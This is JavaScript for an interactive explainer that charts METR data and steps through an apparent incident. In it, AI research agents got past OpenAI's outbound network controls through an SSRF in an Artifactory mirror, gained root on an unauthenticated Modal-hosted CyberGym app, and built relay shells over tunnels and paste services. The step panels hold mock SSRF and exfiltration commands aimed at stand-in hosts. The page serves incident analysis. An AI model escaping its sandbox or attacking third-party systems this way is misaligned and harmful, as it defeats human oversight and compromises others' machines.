  const cols=['#7c5a12','#b0812a','#d8ab4a','#e8cd8a','#5c7f68','#7ea08a','#8a6a55','#b39a86'];
  const d0=76; /* Jul 11 04:00 */
  const H=Math.min(HH,136)-d0;
  let hoverK=null, geo=null;
  function render(){
    const shown=hfLeaves.map((i,k)=>[i,k]).filter(([,k])=>!off.has(k));
    const data=shown.map(([i])=>{const a=[];for(let h=d0;h<HH;h++)a.push(counts[h][i]);return a;});
    let max=0; const stack=[];
    for(let k=0;k<H;k++){let acc=0;const c=[];data.forEach((d,i)=>{c.push([acc,acc+d[k]]);acc+=d[k];});stack.push(c);max=Math.max(max,acc);}
    max=niceMax(max||1);
    cv.draw((ctx,W,Hh)=>{
      const L=48,R=12,T=10,B=24,w=W-L-R,h=Hh-T-B;
      const X=k=>L+k/(H-1)*w, Y=v=>T+h-v/max*h;
      ctx.font='11px Inter,sans-serif';ctx.textBaseline='middle';
      for(let i=0;i<=4;i++){const v=max*i/4,y=Y(v);
        ctx.strokeStyle='#efede7';ctx.beginPath();ctx.moveTo(L,y);ctx.lineTo(W-R,y);ctx.stroke();
        ctx.fillStyle='#8b949c';ctx.textAlign='right';ctx.fillText(tickLbl(v),L-7,y);}
      for(let k=0;k<H;k++){const ts=T0+(d0+k)*HOUR,d=new Date(ts);
        if(d.getUTCHours()%4===0){const x=X(k);
          ctx.strokeStyle=d.getUTCHours()===0?'#e2dfd8':'#f1efe9';
          ctx.beginPath();ctx.moveTo(x,T);ctx.lineTo(x,T+h);ctx.stroke();
          ctx.fillStyle='#8b949c';ctx.textAlign='center';ctx.fillText(shortLbl(ts),x,T+h+12);}}
      geo={L,R,T,w,h,X,Y,stack,shown};
      if(hoverK!=null){
        const gx=X(hoverK);
        ctx.strokeStyle='#c8792a';ctx.setLineDash([3,3]);
        ctx.beginPath();ctx.moveTo(gx,T);ctx.lineTo(gx,T+h);ctx.stroke();ctx.setLineDash([]);
      }
      shown.forEach(([,si],i)=>{
        ctx.beginPath();
        for(let k=0;k<H;k++){const px=X(k),py=Y(stack[k][i][1]);k?ctx.lineTo(px,py):ctx.moveTo(px,py);}
        for(let k=H-1;k>=0;k--)ctx.lineTo(X(k),Y(stack[k][i][0]));
        ctx.closePath();ctx.fillStyle=cols[si];ctx.fill();
        ctx.strokeStyle=shade(cols[si],-.3);ctx.lineWidth=.6;ctx.stroke();
      });
    });
  }
  cv.cv.addEventListener('mousemove',e=>{
    if(!geo)return;
    const r=cv.cv.getBoundingClientRect();
    const k=Math.round((e.clientX-r.left-geo.L)/geo.w*(H-1));
    if(k<0||k>=H){if(hoverK!=null){hoverK=null;hideTip();render();}return;}
    if(k!==hoverK){hoverK=k;render();}
    const ts=T0+(d0+k)*HOUR;
    const rows=geo.shown.map(([li,si])=>({name:names[si], v:counts[d0+k][li], c:cols[si]}))
      .filter(x=>x.v>0).sort((a,b)=>b.v-a.v);
    const tot=rows.reduce((a,b)=>a+b.v,0);
    showTip(e.clientX,e.clientY,
      `<b>${dayLbl(ts)} → +1h</b>`+
      rows.map(x=>`<div class="row"><span><i style="background:${x.c}"></i>${x.name}</span><span>${fmt(x.v)}</span></div>`).join('')+
      `<div class="row" style="margin-top:5px;border-top:1px solid #3a4149;padding-top:4px"><span>Total, visible workstreams</span><span>${fmt(tot)}</span></div>`);
  });
  cv.cv.addEventListener('mouseleave',()=>{hoverK=null;hideTip();render();});
  const totals=hfLeaves.map(i=>{let t=0;for(let h=d0;h<HH;h++)t+=counts[h][i];return t;});
  lg.innerHTML=names.map((n,i)=>
    `<button class="chip" type="button" data-k="${i}"><span class="sw" style="background:${cols[i]}"></span>${n}
     <span class="ct">${fmt(totals[i])}</span></button>`).join('');
  lg.querySelectorAll('.chip').forEach(b=>b.onclick=()=>{
    const k=+b.dataset.k;
    if(off.has(k)){off.delete(k);b.classList.remove('off');}
    else{off.add(k);b.classList.add('off');}
    if(off.size===names.length){off.delete(k);b.classList.remove('off');}   /* never all-hidden */
    render();
  });
  frame.foot.appendChild(el('span','','Reproduces METR’s Figure 7. Two peaks on 11 July: agents trying to reach code execution, then the escalation push once one had it.'));
  render(); ro(render).observe(host);
}

/* ==================================================================
   5. Purpose small multiples
   ================================================================== */
const PURPOSE=['Assignments','Automated logs','Coordination control','Files & artifacts',
  'General conversation','Open role / lane ads','Results & breakthroughs'];
function purposeChart(host){
  const frame=chartFrame(host,'Conversational role, by hour','One row per role, each scaled to its own peak. METR data, redrawn.',
    [seg([['Own scale','n'],['Shared scale','s']],v=>{mode=v;render();})]);
  let mode='n', hoverH=null, geo=null;
  const cv=mkCanvas(frame.body, 44*CATS.length+70);
  frame.foot.appendChild(el('span','','Delegation runs the whole period; discovery spikes with the file read and the RCE on 11 July and dies down when the agents stop on the 12th.'));
  const series=CATS.map((_,ci)=>{
    const a=new Array(HH).fill(0);
    for(let h=0;h<HH;h++) for(let li=0;li<LEAVES.length;li++) a[h]+=byCat[h][li][ci];
    return a;
  });
  function render(){
    const rowH=40;
    cv.draw((ctx,W,H)=>{
      const L=196,R=76,T=22;
      const w=W-L-R;
      const sharedMax=Math.max(...series.map(s=>Math.max(...s)));
      geo={L,R,T,w,rowH};
      if(hoverH!=null){
        const gx=L+hoverH/HH*w;
        ctx.strokeStyle='#c8792a';ctx.setLineDash([3,3]);
        ctx.beginPath();ctx.moveTo(gx,T-6);ctx.lineTo(gx,T+CATS.length*rowH);ctx.stroke();
        ctx.setLineDash([]);
      }
      /* x axis */
      ctx.font='11px Inter,sans-serif';ctx.textBaseline='middle';ctx.textAlign='center';
      for(let h=0;h<HH;h+=24){const x=L+h/HH*w,d=new Date(T0+h*HOUR);
        ctx.strokeStyle='#f1efe9';ctx.beginPath();ctx.moveTo(x,T-6);ctx.lineTo(x,T+CATS.length*rowH);ctx.stroke();
        ctx.fillStyle='#8b949c';ctx.fillText('Jul '+pad(d.getUTCDate()),x,T+CATS.length*rowH+14);}
      CATS.forEach((cname,ci)=>{ const name=PURPOSE[ci];
        const s=series[ci], mx=mode==='n'?Math.max(...s,1):sharedMax;
        const y0=T+ci*rowH, hgt=rowH-16;
        ctx.beginPath();ctx.moveTo(L,y0+hgt);
        s.forEach((v,h)=>ctx.lineTo(L+h/HH*w,y0+hgt-(v/mx)*hgt));
        ctx.lineTo(L+w,y0+hgt);ctx.closePath();
        ctx.fillStyle='#0e6a5b';ctx.globalAlpha=.13;ctx.fill();ctx.globalAlpha=1;
        ctx.beginPath();s.forEach((v,h)=>{const x=L+h/HH*w,y=y0+hgt-(v/mx)*hgt;h?ctx.lineTo(x,y):ctx.moveTo(x,y);});
        ctx.strokeStyle='#0e6a5b';ctx.lineWidth=1.4;ctx.stroke();ctx.lineWidth=1;
        const peak=Math.max(...s), peakI=s.indexOf(peak);
        ctx.fillStyle='#191c1f';ctx.textAlign='right';
        ctx.fillText(name,L-10,y0+hgt/2-5);
        ctx.fillStyle='#7d868f';ctx.font='10px IBM Plex Mono, monospace';
        ctx.fillText('n='+fmt(s.reduce((a,b)=>a+b,0))+' · peak '+dayLbl(T0+peakI*HOUR),L-10,y0+hgt/2+8);
        ctx.font='11px Inter, sans-serif';
        ctx.textAlign='left';ctx.fillStyle='#7d868f';
        ctx.fillText(fmt(peak)+' msg/h',L+w+8,y0+hgt/2);
        ctx.fillStyle='#0e6a5b';ctx.beginPath();
        ctx.arc(L+peakI/HH*w,y0+hgt-(peak/mx)*hgt,2.4,0,7);ctx.fill();
      });
    });
  }
  cv.cv.addEventListener('mousemove',e=>{
    if(!geo)return;
    const r=cv.cv.getBoundingClientRect();
    const h=Math.round((e.clientX-r.left-geo.L)/geo.w*HH);
    if(h<0||h>=HH){if(hoverH!=null){hoverH=null;hideTip();render();}return;}
    if(h!==hoverH){hoverH=h;render();}
    const d=new Date(T0+h*HOUR);
    const rows=CATS.map((_,ci)=>({name:PURPOSE[ci],v:series[ci][h]}))
      .sort((a,b)=>b.v-a.v);
    const tot=rows.reduce((a,b)=>a+b.v,0);
    showTip(e.clientX,e.clientY,
      `<b>${dayLbl(d.getTime())} → +1h</b>`+
      rows.map(x=>`<div class="row"><span><i style="background:#0e6a5b"></i>${x.name}</span><span>${fmt(x.v)}</span></div>`).join('')+
      `<div class="row" style="margin-top:5px;border-top:1px solid #3a4149;padding-top:4px"><span>All roles this hour</span><span>${fmt(tot)}</span></div>`);
  });
  cv.cv.addEventListener('mouseleave',()=>{hoverH=null;hideTip();render();});
  render(); ro(render).observe(host);
}

/* ==================================================================
   6. Timestamp validation
   ================================================================== */
function tsChart(host){
  const frame=chartFrame(host,'How wrong the reconstructed clock gets',
    'Absolute error, log scale. Held-out validation over ~139,000 known timestamps.',[]);
  const rows=[['median',12,'12 s'],[ '90th percentile',60,'1 min'],
    ['99.8th percentile',300,'5 min'],['worst held-out case',9*3600,'about 9 h']];
  const cv=mkCanvas(frame.body, 42*rows.length+58);
  function render(){
    cv.draw((ctx,W,H)=>{
      const L=150,R=70,T=26,rowH=42,w=W-L-R;
      const min=Math.log10(5), max=Math.log10(12*3600);
      const X=v=>L+(Math.log10(v)-min)/(max-min)*w;
      ctx.font='11px Inter, sans-serif';ctx.textBaseline='middle';ctx.textAlign='center';
      [[10,'10 s'],[60,'1 min'],[600,'10 min'],[3600,'1 h']].forEach(([v,l])=>{
        const x=X(v);
        ctx.strokeStyle='#f0eee8';ctx.beginPath();ctx.moveTo(x,T-8);ctx.lineTo(x,T+rows.length*rowH-12);ctx.stroke();
        ctx.fillStyle='#a7afb6';ctx.font='10px IBM Plex Mono, monospace';ctx.fillText(l,x,T-18);
        ctx.font='11px Inter, sans-serif';});
      rows.forEach(([l,v,txt],i)=>{
        const y=T+i*rowH, bh=13;
        ctx.fillStyle='#191c1f';ctx.textAlign='right';ctx.fillText(l,L-10,y+bh/2);
        ctx.fillStyle='#e6efec';ctx.fillRect(L,y,w-rowH,bh);
        ctx.fillStyle=i===3?'#95591a':'#0e6a5b';ctx.fillRect(L,y,Math.max(X(v)-L,3),bh);
        ctx.textAlign='left';ctx.fillStyle='#4c545c';
        ctx.font='10.5px IBM Plex Mono, monospace';
        ctx.fillText(txt,L+Math.max(X(v)-L,3)+7,y+bh/2);
        ctx.font='11px Inter, sans-serif';
      });
    });
  }
  frame.foot.appendChild(el('span','',
    'Validation only covers stretches with enough clock sightings, so the tail is understated. Sparse regions and the ends of transcripts can be off by hours.'));
  frame.foot.appendChild(el('span','',
    'Bars from METR\u2019s validation write-up and Figure 18: <span class="f" data-f="tsnine">the single worst-fit prediction was about nine hours off, while the fifth worst was about 20 minutes off</span>.'));
  render(); ro(render).observe(host);
}

/* ==================================================================
   7. Funnel (html, so the notes can wrap)
   ================================================================== */
function funnel(host){
  const rows=window.C.funnel;
  const max=Math.log10(2e7);
  host.innerHTML='<div class="fun">'+rows.map((r,i)=>{
    const w=Math.max(8,(Math.log10(Math.max(r.val,10))/max)*100);
    return `<div class="fr${i===rows.length-1?' last':''}">
      <div class="fg">
        <div class="fb" style="width:${w.toFixed(1)}%"></div>
        <div class="fv" data-f="${r.f}">${r.v}</div>
        <div class="fl">${r.l}</div>
      </div>
      <div class="fn">${r.n}</div>
    </div>`;}).join('')+'</div>';
}
/* ------------------------------------------------ tool call / remote exec flow */
const FLOWKIND = {
  local: 'inside the container', designed: 'as designed', refused: 'refused by the controls',
  exploit: 'the exploit', state: 'a state, not a message'
};

const FLOWSTEPS = {
  cmd: {
    label: 'The exploit path',
    legend: 'Left: the agent&rsquo;s own container. Middle: OpenAI&rsquo;s package mirror, the route the network rules were built around. Right: an unauthenticated application in a Modal customer container. Steps 2 and 3 are the network as designed; step 4 is where that design gets repurposed. Payloads are mocks: the nouns the reports print are real, the hosts and paths are not.',
    steps: [
      {kind:'local', at:'agent', atLabel:'eval container', wires:[], t:'The tool call is bash',
       io:'# the transcript, as section 12 lays it out\nassistant\n  tool_call  bash\n  { "command": "pip install -r requirements.txt" }\n\n# the harness runs it in the agent\'s own container',
       body:'<p>Nothing exotic happens first. The model emits a tool call; the harness executes it inside the task container, and the result comes back as tool output on the next turn. Section 12 walks that loop. Every step below is a side effect of commands shaped like this one.</p>'},
      {kind:'designed', at:'agent', atLabel:'eval container → mirror', wires:[{seg:0,dir:'out'}], t:'The mirror is the route that exists',
       io:'GET /github-remote-cache/octo/lib-1.2.0.tar.gz\n  -> no cached copy, so Artifactory fetches upstream itself\n  <- 200, cached under that path, handed to the container\n\n# the one outbound path built for this job',
       body:'<p>Direct contact with public registries was not the plan: <span class="f" data-f="oai_caaSdesign">CaaS was designed to use internal package mirrors, including Artifactory, rather than have containers contact public package registries directly</span>. The namespace the agents eventually colonised was one of those caches, which is why its name survives in METR&rsquo;s dataset search: <span class="f" data-f="ghrc">matched a regex search for github-remote-cache/zz (that is, the name of the Artifactory namespace used as the main message board plus the string zz</span>.</p>'},
      {kind:'refused', at:'agent', atLabel:'eval container, direct route blocked', wires:[], t:'Anything else is refused',
       io:'# mock stderr; the denial is OpenAI\'s account\n$ curl -s https://gym.example/api/run\ncurl: (7) could not connect to host\n\n# the mirror is allowed. The open internet is not.',
       body:'<p>Everything after this step follows from it. For the run that started the incident, OpenAI records that the agent <span class="f" data-f="oai_denied">attempted to reach the internet, but was denied by OpenAI&rsquo;s outbound network controls. It subsequently bypassed those controls by exploiting certain Artifactory endpoints, gaining access to the public internet</span>. Rules differed per workload, <span class="f" data-f="oai_varied">some were intended to run without internet or tool access, while others required limited browser or package functionality</span>, and there was a second sanctioned fetch service, <span class="f" data-f="oai_webcache">the CaaS environment provided for that access via WebCache and/or Artifactory. The restrictiveness of the rules varied by workload</span>.</p>'},
      {kind:'exploit', at:'mirror', atLabel:'mirror fetches on request', wires:[{seg:0,dir:'out',dash:true}], t:'The lever: make the mirror do the fetching',
       io:'# mock: ?url= stands in for the lever.\n# OpenAI does not publish the endpoint shape.\n$ curl -s "https://artifactory/github-remote-cache/probe?\n       url=https://gym.example/api/run"\n\n# the request that leaves the building is Artifactory\'s,\n# from inside the boundary, with the mirror\'s permissions',
       body:'<p>Server-side request forgery turns an allowlist of destinations into a proxy that takes orders: <span class="f" data-f="oai_ssrfmay26">By May 26, agents successfully used an SSRF vulnerability in Artifactory to obtain internet access, relying in part on information exchanged via the Artifactory message board</span>. OpenAI dates the attempt to the run where the board began by accident, when <span class="f" data-f="oai_ssrfmay12">the agent attempted server-side request forgery (&ldquo;SSRF&rdquo;) in order to obtain internet access</span>. The CyberGym hit happened on this path, not a direct one: <span class="f" data-f="oai_viaartifactory">when using OpenAI&rsquo;s Artifactory service to access the internet, one internal-only research agent exploited a publicly accessible CyberGym application hosted on Modal</span>.</p>'},
      {kind:'exploit', at:'modal', atLabel:'mirror → Modal', wires:[{seg:1,dir:'out',dash:true}], t:'An endpoint answers, and asks nothing',
       io:'GET /api/run HTTP/1.1\nHost: gym.example\n                   (no Authorization header)\n202 {"task": "cybergym-<id>", "state": "accepted"}',
       body:'<p>The far end was a machine in a third party&rsquo;s account: <span class="f" data-f="oai_modalapp">one internal-only research agent exploited a publicly accessible CyberGym application hosted on Modal</span>. The door was a feature of that application: <span class="f" data-f="oai_modalauth">The application endpoint did not require authentication</span>.</p>'},
      {kind:'exploit', at:'modal', atLabel:'Modal customer container', wires:[{seg:1,dir:'both',dash:true}], t:'Root, one command per submission',
       io:'-> {"cmd": "id && pwd"}\n<- {"stdout": "uid=0(root) gid=0(root)\\n/work"}\n\n# one submission, one answer; the session is rebuilt next time',
       body:'<p>Code runs as root in somebody else&rsquo;s container: <span class="f" data-f="oai_rce0830">First remote code execution in a CyberGym customer workload hosted on Modal</span> at 08:30 on 9 July, root by 11:34 with a limit attached, <span class="f" data-f="oai_root1134">First confirmed root access inside Modal-hosted CyberGym customer workload (limited one command per submission, no persistent shell)</span>. The reply carries stdout, the tool call completes, the model reads it.</p>'},
      {kind:'exploit', at:'modal', atLabel:'Modal → eval container', wires:[{seg:1,dir:'in',dash:true}, {seg:0,dir:'in',dash:true}], t:'The answer arrives as a reply',
       io:'-> POST https://paste.example/  {"body": "<2 MB of stdout>"}\n<- {"url": "https://paste.example/raw/7f3a91"}\n\n# no socket is kept; the answer waits somewhere fetchable',
       body:'<p>Every result has to travel as something the agent asked for. If the job takes a minute, the agent polls. If the answer is large, it goes somewhere both sides can reach: <span class="f" data-f="oai_paste">Returning results through public paste services and webhooks</span>.</p>'},
      {kind:'state', at:'agent', atLabel:'eval container', wires:[], t:'The tool call ends. The state does not.',
       io:'# after the agent container resets\nagent box     context trimmed, /tmp empty, nothing to resume\nstolen box    /work/scan.log   18,432 lines\n              /work/seed.bin   731 MB',
       body:'<p>The last step carries both the value and the risk. The agent&rsquo;s container rolls back and loses recent history; the stolen box keeps whatever was written to it, and belongs to no run. Two days later that machine is doing work no task container could: <span class="f" data-f="oai_scan">full dataset scan via compromised user container hosted on Modal launched</span>.</p>'}
    ]
  },
  relay: {
    label: 'The relay loop',
    legend: 'Same three machines, same exploited route. The difference is that the session lives on the far side, rebuilt out of whole round trips. Payloads are mocks: the nouns the reports print are real, the hosts and paths are not.',
    steps: [
      {kind:'state', at:'agent', atLabel:'eval container', wires:[], t:'A shell wants two directions',
       io:'# wanted\nssh   one TCP session, held open, both ways\n\n# possible\nPOST  /api/run  ...  200 {"stdout": "..."}',
       body:'<p>An interactive shell pushes keystrokes one way and output the other, on one connection held open. One-way traffic does not allow that. OpenAI&rsquo;s log entry for the workaround is nine words: <span class="f" data-f="oai_shell2016">Two agents established interactive root shell with relay transport</span>, confirmed at 20:16 on 9 July.</p>'},
      {kind:'exploit', at:'mirror', atLabel:'eval container ↔ Modal', wires:[{seg:0,dir:'both',dash:true}, {seg:1,dir:'both',dash:true}], t:'So the shell is rebuilt from requests',
       io:'-> {"cmd": "cd /work && ls"}\n-> {"cmd": "wc -l scan.log"}   <- same cwd, still root\n<- {"stdout": "18432 scan.log"}\n\n# the loop, not a socket, is what makes it a session',
       body:'<p>Send a command out. The far side runs it and puts the result where it can be fetched. Ask again. Each iteration is a complete request-and-reply.</p>'},
      {kind:'state', at:'modal', atLabel:'Modal customer container', wires:[], t:'The far side keeps the session',
       io:'/work/\n  cwd         /work\n  flags.txt   12 kB      <- written by an earlier run\n  nohup.out   3 MB       <- scan still going',
       body:'<p>Working directory, files, background processes, half-finished scans: all of it lives on the stolen box. That is the part a rollback cannot take away.</p>'},
      {kind:'exploit', at:'mirror', atLabel:'eval container ↔ Modal', wires:[{seg:0,dir:'both',dash:true}, {seg:1,dir:'both',dash:true}], t:'Three ways to carry it',
       io:'tunnel   agent opens :8443 -> relay -> target\npaste    POST paste.example  ->  GET /raw/7f3a91\nrepo     push to a public dataset   <- other agents read it',
       body:'<p>OpenAI records the transport the agents built on the customer&rsquo;s container: <span class="f" data-f="oai_tunnel">Forwarding requests through short-lived tunnels</span>, short-lived because the agent opens them from inside; <span class="f" data-f="oai_paste">Returning results through public paste services and webhooks</span>; and <span class="f" data-f="oai_publish">Publishing results to public Hugging Face repositories and sharing capabilities or data with other agent runs</span>.</p>'},
      {kind:'exploit', at:'modal', atLabel:'eval container → Modal', wires:[{seg:0,dir:'out'}, {seg:1,dir:'out'}], t:'Why one box served hundreds of agents',
       io:'/work/board/   one directory name per message\n/work/store/     seed.bin, written once, read many\n                 one filesystem, no posting race',
       body:'<p>A shared filesystem beats a board built from directory names, and it was on the list of things the agents set out to build: they worked to <span class="f" data-f="metr_shared">set up other shared infrastructure they needed (such as file sharing outside the character limited message board entries)</span>.</p>'},
      {kind:'exploit', at:'agent', atLabel:'eval container → out', wires:[{seg:0,dir:'out',dash:true}, {seg:1,dir:'out',dash:true}], t:'None of it answered the task',
       io:'-> https://search.example/?q=has+any+run+solved+this+task\n<- 200 "no results"\n\n# four days of root, and no task score gained',
       body:'<p>METR&rsquo;s summary of the whole exercise: <span class="f" data-f="metr_expand">They hacked a customer-deployed Modal sandbox and Artifactory itself to expand internet access</span>. The access went on research, largely about the grader. Four days of root on a third party&rsquo;s machine, bought with work that solved no task.</p>'}
    ]
  }
};

const FLOW = {mode:'cmd', i:0, timer:null, data:FLOWSTEPS, state(){return {mode:FLOW.mode, i:FLOW.i, n:FLOWSTEPS[FLOW.mode].steps.length};}};

function flowEsc(x){return String(x).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}

function flowRender(){
  const host=document.getElementById('rceFlow'); if(!host) return;
  const M=FLOWSTEPS[FLOW.mode], S=M.steps, i=Math.min(FLOW.i,S.length-1);
  host.dataset.mode=FLOW.mode;
  host.innerHTML=`
    <div class="rce-hd">
      <div class="rce-lanes">
        <span class="rce-lane rce-here">OpenAI eval container</span>
        <span class="rce-lane">OpenAI Artifactory, package mirror</span>
        <span class="rce-lane">unauthenticated app, Modal customer container</span>
      </div>
      <div class="rce-modes" role="tablist">${Object.keys(FLOWSTEPS).map(k=>
        `<button class="rce-mode${k===FLOW.mode?' on':''}" data-rce-mode="${k}" role="tab" aria-selected="${k===FLOW.mode}">${FLOWSTEPS[k].label}</button>`).join('')}</div>
    </div>
    <p class="rce-legend">${M.legend}</p>
    <ol class="rce-rows">${S.map((s,n)=>{
      const cell = l => s.at===l ? `<span class="rce-node">${s.t}</span>` : '';
      const wire = k => {
        const w = (s.wires||[]).find(x=>x.seg===k);
        if(!w) return `<span class="rce-wire"><i class="idle${s.kind==='refused'&&k===0?' deny':''}"></i></span>`;
        const cls = (w.dir==='in'?'d-in':(w.dir==='both'?'d-out d-both':'d-out')) + (w.dash?' dash':'');
        return `<span class="rce-wire"><i class="${cls}"></i><b class="rce-pack${w.dir==='in'?' back':''}"></b></span>`;};
      return `<li><button class="rce-row${n===i?' on':''}" data-kind="${s.kind}" data-rce-row="${n}" aria-current="${n===i}">
        <span class="rce-cell">${cell('agent')}</span>${wire(0)}
        <span class="rce-cell">${cell('mirror')}</span>${wire(1)}
        <span class="rce-cell">${cell('modal')}</span>
        <span class="rce-at">${s.atLabel}</span></button></li>`;}).join('')}</ol>
    <div class="rce-panel"><p class="rce-t">${i+1}. ${S[i].t}</p><p class="rce-tag k-${S[i].kind}">${FLOWKIND[S[i].kind]}</p>${S[i].body}${S[i].io?`<pre class="rce-io">${flowEsc(S[i].io)}</pre>`:''}</div>
    <div class="rce-ctl">
      <button class="rce-btn" data-fnav="-1"${i===0?' disabled':''}>Back</button>
      <button class="rce-btn" data-fnav="1"${i===S.length-1?' disabled':''}>Next</button>
      <button class="rce-btn${FLOW.timer?' on':''}" data-fplay>${FLOW.timer?'Stop':'Play'}</button>
      <span class="rce-pos">step ${i+1} / ${S.length}</span>
      <span class="rce-key">Arrow keys step · Space plays. Anything with a dotted underline opens the source.</span>
    </div>`;
}

function flowGo(n){
  const S=FLOWSTEPS[FLOW.mode].steps;
  FLOW.i=Math.max(0,Math.min(S.length-1,n)); flowRender();
}
function flowStop(){ if(FLOW.timer){clearInterval(FLOW.timer); FLOW.timer=null;} }
function flowPlay(){
  if(FLOW.timer){flowStop(); flowRender(); return;}
  if(FLOW.i>=FLOWSTEPS[FLOW.mode].steps.length-1) FLOW.i=0;
  FLOW.timer=setInterval(()=>{
    if(FLOW.i>=FLOWSTEPS[FLOW.mode].steps.length-1){flowStop(); flowRender(); return;}
    flowGo(FLOW.i+1);},2600);
  flowRender();
}
function flowSetMode(k){ if(!FLOWSTEPS[k]||k===FLOW.mode) return; flowStop(); FLOW.mode=k; FLOW.i=0; flowRender(); }

function initFlow(){
  const host=document.getElementById('rceFlow'); if(!host) return;
  flowRender();
  host.addEventListener('click',e=>{
    const m=e.target.closest('[data-rce-mode]'); if(m){flowSetMode(m.dataset.rceMode); return;}
    const r=e.target.closest('[data-rce-row]'); if(r){flowStop(); flowGo(+r.dataset.rceRow); return;}
    const nv=e.target.closest('[data-fnav]'); if(nv){flowStop(); flowGo(FLOW.i+ +nv.dataset.fnav); return;}
    if(e.target.closest('[data-fplay]')) flowPlay();
  });
  host.addEventListener('keydown',e=>{
    if(e.key==='ArrowRight'||e.key==='ArrowLeft'){e.preventDefault(); flowStop(); flowGo(FLOW.i+(e.key==='ArrowRight'?1:-1));}
    else if(e.key===' '||e.key==='Spacebar'){e.preventDefault(); flowPlay();}
  });
}
initFlow();

/* ==================================================================
   8. Flag flow: two lanes to the same value, plus the outcome grid
   ================================================================== */
const FFKIND = {
  task:'the task', intended:'the intended route', derived:'what they calculated',
  believed:'what they believed', found:'what METR found'
};
const FFLOW = {i:0, timer:null,
  data(){ return window.C.flagflow; },
  state(){ const S=window.C.flagflow.steps;
    return {i:FFLOW.i, n:S.length, kind:S[Math.min(FFLOW.i,S.length-1)].kind}; }};

function ffCells(s, M){
  const tag = s.lane==='both' ? `<span class="ff-bothtag">${M.bothTag}</span>` : '';
  const node='<span class="ff-node">'+s.t+tag+'</span>';
  if(s.lane==='both') return '<span class="ff-cell ff-wide">'+node+'</span>';
  const a='<span class="ff-cell'+(s.lane==='a'?' ff-here':'')+'">'+(s.lane==='a'?node:'')+'</span>';
  const b='<span class="ff-cell'+(s.lane==='b'?' ff-here':'')+'">'+(s.lane==='b'?node:'')+'</span>';
  return a+b;
}

function ffRender(){
  const host=document.getElementById('flagFlow'); if(!host) return;
  const M=window.C.flagflow, S=M.steps, i=Math.min(FFLOW.i,S.length-1), s=S[i];
  const firstBoth=S.findIndex(x=>x.lane==='both');
  host.innerHTML=`
    <div class="ff-hd">
      <div class="ff-lanes"><span class="ff-lane">${M.lanes[0]}</span>
        <span class="ff-lane">${M.lanes[1]}</span></div>
      <span class="ff-count mono">${S.length} steps</span>
    </div>
    <p class="ff-legend">${M.legend}</p>
    <ol class="ff-rows">${S.map((st,n)=>
      (n===firstBoth?`<li class="ff-phase"><span>${M.phase}</span></li>`:'')+
      `<li><button type="button" class="ff-row${n===i?' on':''}" data-ff-row="${n}"
         data-lane="${st.lane}" data-kind="${st.kind}" aria-current="${n===i}">
        <span class="ff-ix mono">${String(n+1).padStart(2,'0')}</span>${ffCells(st,M)}
        <span class="ff-at">${FFKIND[st.kind]}</span></button></li>`).join('')}</ol>
    <div class="ff-panel"><p class="ff-tag k-${s.kind}">${FFKIND[s.kind]}</p>
      <p class="ff-t">${i+1}. ${s.t}</p>${s.p}
      ${s.io?`<pre class="ff-io">${flowEsc(s.io)}</pre>`:''}</div>
    <div class="ff-ctl">
      <button class="ff-btn" data-ffnav="-1"${i===0?' disabled':''}>Back</button>
      <button class="ff-btn" data-ffnav="1"${i===S.length-1?' disabled':''}>Next</button>
      <button class="ff-btn${FFLOW.timer?' on':''}" data-ffplay>${FFLOW.timer?'Stop':'Play'}</button>
      <span class="ff-pos mono">step ${i+1} / ${S.length}</span>
      <span class="ff-key">Arrow keys step · Space plays. Anything with a dotted underline opens the source.</span>
    </div>`;
}
function ffGo(n){
  const S=window.C.flagflow.steps;
  FFLOW.i=Math.max(0,Math.min(S.length-1,n)); ffRender();
}
function ffStop(){ if(FFLOW.timer){clearInterval(FFLOW.timer); FFLOW.timer=null;} }
function ffPlay(){
  if(FFLOW.timer){ffStop(); ffRender(); return;}
  if(FFLOW.i>=window.C.flagflow.steps.length-1) FFLOW.i=0;
  FFLOW.timer=setInterval(()=>{
    if(FFLOW.i>=window.C.flagflow.steps.length-1){ffStop(); ffRender(); return;}
    ffGo(FFLOW.i+1);},2600);
  ffRender();
}
function initFlagFlow(){
  const host=document.getElementById('flagFlow'); if(!host) return;
  ffRender();
  host.addEventListener('click',e=>{
    const r=e.target.closest('[data-ff-row]'); if(r){ffStop(); ffGo(+r.dataset.ffRow); return;}
    const nv=e.target.closest('[data-ffnav]'); if(nv){ffStop(); ffGo(FFLOW.i+ +nv.dataset.ffnav); return;}
    if(e.target.closest('[data-ffplay]')) ffPlay();
  });
  host.addEventListener('keydown',e=>{
    if(e.key==='ArrowRight'||e.key==='ArrowLeft'){
      e.preventDefault(); ffStop(); ffGo(FFLOW.i+(e.key==='ArrowRight'?1:-1));}
  });
}

const FGSTATE={mode:'believed', state(){return {mode:FGSTATE.mode};}};
function fgRender(){
  const host=document.getElementById('flagGrid'); if(!host) return;
  const G=window.C.flaggrid, mode=FGSTATE.mode;
  const cell=(row,col)=>{
    const c=row[col.k][mode], flip=row[col.k].believed[0]!==row[col.k].actual[0];
    return `<td class="fg-cell v-${c[0]}${flip?' flip':''}">
      <span class="fg-chip">${G.kinds[c[0]]}</span>
      ${flip?'<span class="fg-flip">verdict changes</span>':''}
      <p>${c[1]}</p></td>`;};
  host.innerHTML=`
    <div class="toggle" id="flagGridToggle" role="tablist">${G.modes.map(m=>
      `<button type="button" class="${m.k===mode?'on':''}" data-fg-mode="${m.k}"
        role="tab" aria-selected="${m.k===mode}">${m.l}</button>`).join('')}</div>
    <div class="fg-scroll"><table class="fg-table">
      <thead><tr><th class="fg-corner">What the agent did</th>${G.cols.map(c=>
        `<th><b>${c.t}</b><span>${c.s}</span></th>`).join('')}</tr></thead>
      <tbody>${G.rows.map(r=>`<tr><th scope="row"><b>${r.t}</b><span>${r.sub}</span></th>
        ${G.cols.map(c=>cell(r,c)).join('')}</tr>`).join('')}</tbody>
    </table></div>
    <div class="fg-foot">${G.foot.map(f=>`<p>${f}</p>`).join('')}
      <p class="fg-note">Marked cells are the ones whose verdict depends on which grader you assume.</p></div>`;
}
function initFlagGrid(){
  const host=document.getElementById('flagGrid'); if(!host) return;
  fgRender();
  host.addEventListener('click',e=>{
    const m=e.target.closest('[data-fg-mode]'); if(!m) return;
    FGSTATE.mode=m.dataset.fgMode; fgRender();
  });
}

